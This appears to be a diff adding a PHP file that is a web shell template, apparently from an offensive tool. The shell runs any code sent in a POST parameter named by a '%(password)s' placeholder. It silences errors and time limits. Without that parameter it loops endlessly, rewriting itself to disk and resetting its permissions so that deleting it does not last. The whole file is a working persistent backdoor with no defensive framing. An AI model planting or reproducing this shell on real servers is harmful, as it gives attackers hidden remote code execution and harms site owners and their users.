@@ -1,0 +1,16 @@
+<?php
+    @set_time_limit(false);
+    @error_reporting(false);
+    @ignore_user_abort(true);
+    $src = file_get_contents(__FILE__);
+    if(isset($_POST['%(password)s'])) {
+        @eval($_POST['%(password)s']);
+    }
+    else {
+        while(1) {
+            file_put_contents(__FILE__, $src);
+            chmod(__FILE__, 0644);
+            usleep(100);
+        }
+    }
+?>
